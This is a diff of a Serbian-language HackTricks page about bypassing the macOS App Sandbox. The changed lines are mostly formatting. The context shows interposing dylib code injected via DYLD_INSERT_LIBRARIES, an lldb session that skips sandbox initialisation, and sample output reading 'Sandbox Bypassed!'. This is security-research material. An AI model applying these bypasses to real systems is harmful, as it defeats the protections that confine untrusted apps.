@@ -9,7 +9,7 @@ Drugi načini podrške HackTricks-u:
 * Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
@@ -77,18 +77,21 @@ Ako iz Sandbox procesa uspete da **ugrozite druge procese** koji se izvršavaju 
 [**Ovo istraživanje**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) je otkrilo 2 načina zaobilaženja Sandbox-a. Budući da se Sandbox primenjuje iz userland-a kada se učita biblioteka **libSystem**. Ako bi binarna datoteka mogla izbeći njeno učitavanje, nikada ne bi bila stavljena u Sandbox:
 
 * Ako je binarna datoteka **potpuno statički kompajlirana**, mogla bi izbeći učitavanje te biblioteke.
-* Ako binarna datoteka ne bi trebala da učitava bilo koje biblioteke (jer je i linkera u libSystem), neće morati da učitava libSystem.&#x20;
+* Ako binarna datoteka ne bi trebala da učitava bilo koje biblioteke (jer je i linkera u libSystem), neće morati da učitava libSystem.
 
 ### Shell kodovi
 
 Imajte na umu da **čak i shell kodovi** na ARM64 moraju biti povezani sa `libSystem.dylib`:
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### Ovlašćenja
 
 Imajte na umu da čak i ako su neke **radnje** dozvoljene u **pesku**, ako aplikacija ima određeno **ovlašćenje**, kao što je:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ Imajte na umu da čak i ako su neke **radnje** dozvoljene u **pesku**, ako aplik
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Interpost Bypass
 
 Za više informacija o **Interpostingu** pogledajte:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### Interpostujte `_libsecinit_initializer` da biste sprečili sandbox.
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### Interpost `__mac_syscall` da biste sprečili Sandbox
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,18 +183,21 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Debugiranje i zaobilaženje Sandbox-a pomoću lldb-a
 
 Kompajlirajmo aplikaciju koja bi trebala biti sandboxirana:
 
 {% tabs %}
-{% tab title="sand.c" %}
+{% tab title="undefined" %}
 ```c
 #include <stdlib.h>
 int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
+{% endtab %}
+
 {% tab title="entitlements.xml" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -197,10 +207,8 @@ system("cat ~/Desktop/del.txt");
 </dict>
 </plist>
 ```
-{% tab title="Info.plist" %}
 
-Info.plist
-==========
+## Info.plist
 
 Info.plist je XML datoteka koja sadrži informacije o aplikaciji na macOS platformi. Ova datoteka se koristi za konfigurisanje različitih aspekata aplikacije, uključujući i postavke sandboxa.
 
@@ -212,11 +220,10 @@ Info.plist datoteka se nalazi unutar aplikacijskog paketa i može se uređivati 
 
 Uz to, Info.plist datoteka može sadržati i druge informacije o aplikaciji, kao što su verzija, identifikator paketa, ikona aplikacije i drugi metapodaci.
 
----
+***
 
 **Napomena**: Info.plist datoteka je važan deo konfiguracije aplikacije u sandbox okruženju. Uredjivanje ove datoteke može imati značajan uticaj na sigurnost i funkcionalnost aplikacije, stoga je važno biti pažljiv prilikom izmena.
 
-{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
@@ -247,12 +254,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 Aplikacija će pokušati **pročitati** datoteku **`~/Desktop/del.txt`**, što **Sandbox neće dozvoliti**.\
 Kreirajte datoteku tamo jer će, jednom kada se Sandbox zaobiđe, moći je pročitati:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 Hajde da debagujemo aplikaciju da vidimo kada se učitava Sandbox:
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -329,6 +338,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **Čak i kada je Sandbox zaobiđen, TCC** će pitati korisnika da li želi da dozvoli procesu čitanje fajlova sa desktopa.
 {% endhint %}
@@ -348,7 +358,7 @@ Drugi načini da podržite HackTricks:
 * Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
